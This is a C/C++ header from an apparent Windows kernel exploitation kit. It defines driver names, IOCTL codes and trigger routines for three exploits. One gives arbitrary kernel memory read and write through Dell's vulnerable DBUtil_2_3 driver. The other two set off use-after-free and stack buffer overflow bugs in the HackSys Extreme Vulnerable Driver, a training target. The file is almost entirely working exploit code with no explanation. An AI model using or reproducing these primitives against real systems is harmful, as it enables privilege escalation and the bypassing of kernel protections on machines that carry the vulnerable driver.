#pragma once
#include "AEK.h"
#define EXPLOIT_TYPE_HERE
#define BOF

#ifdef ARAW

#define DRIVER_NAME "\\\\.\\DBUtil_2_3"
#define IOCTL_READ 0x9B0C1EC4
#define IOCTL_WRITE 0x9B0C1EC8

BOOL CreateDevice() {
	return aek::io.create(DRIVER_NAME);
}

UINT64 ARRoutine(PVOID src_krnl) {
	const size_t offset = 3;
	UINT64 input_buffer[4] = { 0, };
	input_buffer[0] = 0x4141414141414141;
	input_buffer[1] = (UINT64)src_krnl;
	input_buffer[2] = 0x0000000000000000;
	input_buffer[3] = 0x0000000000000000;

	auto res = aek::io.ioctl(IOCTL_READ, &input_buffer, sizeof(input_buffer), &input_buffer, sizeof(input_buffer));
	return input_buffer[offset];
}

BOOL AWRoutine(PVOID dest_krnl, UINT64 data_usr) {
	UINT64 input_buffer[4] = { 0, };
	input_buffer[0] = 0x4141414141414141;	// dummy
	input_buffer[1] = (UINT64)dest_krnl;
	input_buffer[2] = 0x0000000000000000;
	input_buffer[3] = data_usr;

	return aek::io.ioctl(IOCTL_WRITE, &input_buffer, sizeof(input_buffer), &input_buffer, sizeof(input_buffer));
}

#endif // ARAW



#ifdef NPP_UAF

#define DRIVER_NAME "\\\\.\\HacksysExtremeVulnerableDriver"
#define IOCTL_ALLOCATE_TRIGGER_POOL 0x222013
#define IOCTL_FAKE_POOL 0x22201F
#define IOCTL_FREE_TRIGGER_POOL 0x22201B
#define IOCTL_TRIGGER_CALLBACK_FUNTION 0x222017
#define CHUNK_SIZE 0x60

BOOL CreateDevice() {
	return aek::io.create(DRIVER_NAME);
}

BOOL _AllocateTriggerPool() {
	return aek::io.ioctl(IOCTL_ALLOCATE_TRIGGER_POOL, NULL, 0, NULL, 0);
}

BOOL _AllocateFakePool(UINT64 value) {
	BYTE fake_pool_buffer[0x60] = { 0, };
	*(UINT64*)fake_pool_buffer = value;
	return aek::io.ioctl(IOCTL_FAKE_POOL, fake_pool_buffer, sizeof(fake_pool_buffer), NULL, 0);
}

BOOL _FreeTriggerPool() {
	return aek::io.ioctl(IOCTL_FREE_TRIGGER_POOL, NULL, 0, NULL, 0);
}

BOOL _TriggerCallbackFunction() {
	return aek::io.ioctl(IOCTL_TRIGGER_CALLBACK_FUNTION, NULL, 0, NULL, 0);
}

#endif // NPP_UAF



#ifdef BOF

#define DRIVER_NAME "\\\\.\\HacksysExtremeVulnerableDriver"
#define IOCTL_BOF 0x222003
#define DUMMY_SIZE 0x818

BOOL CreateDevice() {
	return aek::io.create(DRIVER_NAME);
}

BOOL _TriggerStackOverflow(PVOID payload, size_t size) {
	return aek::io.ioctl(IOCTL_BOF, payload, size, NULL, 0);
}


#endif
